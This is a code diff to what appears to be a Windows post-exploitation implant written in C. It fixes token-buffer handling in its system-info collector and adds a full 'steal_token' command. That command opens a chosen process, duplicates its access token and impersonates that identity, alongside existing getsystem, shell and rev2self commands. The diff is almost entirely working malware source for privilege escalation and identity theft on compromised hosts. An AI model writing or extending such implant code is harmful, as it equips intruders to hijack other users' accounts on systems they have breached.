@@ -71,26 +71,30 @@ void sysinfo_collect(Buffer *tlv_out) {
     if (!gotToken)
         gotToken = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
     if (gotToken) {
-        DWORD token_len;
+        DWORD token_len = 0;
+        unsigned char *token_buf = NULL;
         GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
-        unsigned char *token_buf = (unsigned char *)malloc(token_len);
-        if (GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len)) {
-            TOKEN_USER *tu = (TOKEN_USER *)token_buf;
-            char name[128] = {0}, domain[128] = {0};
-            DWORD name_len = sizeof(name), domain_len = sizeof(domain);
-            SID_NAME_USE snu;
-            if (LookupAccountSidA(NULL, tu->User.Sid, name, &name_len,
-                                  domain, &domain_len, &snu)) {
-                snprintf(buf, sizeof(buf), "%s\\%s", domain, name);
-                tlv_add_string(tlv_out, TLV_USERNAME, buf);
+        if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL) {
+            if (GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len)) {
+                TOKEN_USER *tu = (TOKEN_USER *)token_buf;
+                char name[128] = {0}, domain[128] = {0};
+                DWORD name_len = sizeof(name), domain_len = sizeof(domain);
+                SID_NAME_USE snu;
+                if (LookupAccountSidA(NULL, tu->User.Sid, name, &name_len,
+                                      domain, &domain_len, &snu)) {
+                    snprintf(buf, sizeof(buf), "%s\\%s", domain, name);
+                    tlv_add_string(tlv_out, TLV_USERNAME, buf);
+                }
             }
+            free(token_buf);
         }
-        free(token_buf);
 
         /* Integrity level */
+        token_len = 0;
+        token_buf = NULL;
         GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
-        token_buf = (unsigned char *)malloc(token_len);
-        if (GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
+        if (token_len > 0 && (token_buf = (unsigned char *)malloc(token_len)) != NULL &&
+            GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
             TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
             DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                          *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
@@ -592,7 +596,7 @@ static void mod_shell_exec(Buffer *out, const char *cmd_line, BOOL use_powershel
     DBG("[shell] executing: %s", full_cmd);
 
     /*
-     * If the thread is impersonating (getsystem / tokenmanip), use
+     * If the thread is impersonating (getsystem / steal_token), use
      * CreateProcessWithTokenW so the child runs as the impersonated
      * identity.  Only needs SeImpersonatePrivilege (admins have it).
      * Fall back to plain CreateProcessA when not impersonating.
@@ -774,6 +778,85 @@ BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
             free(cmd_str);
         } else {
             buf_append(&out, "No command specified\n", 20);
+        }
+    }
+    else if (strcmp(name, "steal_token") == 0) {
+        /* steal_token <PID>
+         * Opens target process, duplicates its token, impersonates it.
+         * Args come as raw string: the PID number. */
+        DWORD target_pid = 0;
+        if (args && args_len > 0) {
+            char pid_str[32] = {0};
+            DWORD copy_len = args_len < 31 ? args_len : 31;
+            memcpy(pid_str, args, copy_len);
+            target_pid = (DWORD)atoi(pid_str);
+        }
+        if (target_pid == 0) {
+            buf_append(&out, "[!] Usage: steal_token <PID>\n", 28);
+        } else {
+            HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
+            if (!hProc)
+                hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, target_pid);
+            if (!hProc) {
+                char err[128];
+                snprintf(err, sizeof(err), "[!] OpenProcess(%u) failed: %u\n",
+                         (unsigned)target_pid, (unsigned)GetLastError());
+                buf_append(&out, err, (DWORD)strlen(err));
+            } else {
+                HANDLE hToken = NULL;
+                if (!OpenProcessToken(hProc, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &hToken)) {
+                    char err[128];
+                    snprintf(err, sizeof(err), "[!] OpenProcessToken(%u) failed: %u\n",
+                             (unsigned)target_pid, (unsigned)GetLastError());
+                    buf_append(&out, err, (DWORD)strlen(err));
+                    CloseHandle(hProc);
+                } else {
+                    HANDLE hDup = NULL;
+                    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+                                          SecurityImpersonation, TokenImpersonation, &hDup)) {
+                        char err[128];
+                        snprintf(err, sizeof(err), "[!] DuplicateTokenEx failed: %u\n",
+                                 (unsigned)GetLastError());
+                        buf_append(&out, err, (DWORD)strlen(err));
+                    } else {
+                        if (!ImpersonateLoggedOnUser(hDup)) {
+                            char err[128];
+                            snprintf(err, sizeof(err), "[!] ImpersonateLoggedOnUser failed: %u\n",
+                                     (unsigned)GetLastError());
+                            buf_append(&out, err, (DWORD)strlen(err));
+                            CloseHandle(hDup);
+                        } else {
+                            /* Success — resolve the stolen identity */
+                            DWORD tlen = 0;
+                            GetTokenInformation(hDup, TokenUser, NULL, 0, &tlen);
+                            char user_str[256] = "???";
+                            if (tlen > 0) {
+                                unsigned char *tbuf = (unsigned char *)malloc(tlen);
+                                if (tbuf && GetTokenInformation(hDup, TokenUser, tbuf, tlen, &tlen)) {
+                                    TOKEN_USER *tu = (TOKEN_USER *)tbuf;
+                                    char uname[128] = {0}, domain[128] = {0};
+                                    DWORD uname_len = sizeof(uname), domain_len = sizeof(domain);
+                                    SID_NAME_USE snu;
+                                    if (LookupAccountSidA(NULL, tu->User.Sid, uname, &uname_len,
+                                                          domain, &domain_len, &snu)) {
+                                        snprintf(user_str, sizeof(user_str), "%s\\%s", domain, uname);
+                                    }
+                                }
+                                free(tbuf);
+                            }
+                            char msg[512];
+                            snprintf(msg, sizeof(msg),
+                                "[+] Successfully stole token from PID %u\n"
+                                "[+] Impersonating: %s\n",
+                                (unsigned)target_pid, user_str);
+                            buf_append(&out, msg, (DWORD)strlen(msg));
+                            /* Don't close hDup — impersonation holds the reference */
+                        }
+                    }
+                    CloseHandle(hToken);
+                    CloseHandle(hProc);
+                }
+            }
         }
     }
     else if (strcmp(name, "rev2self") == 0) {
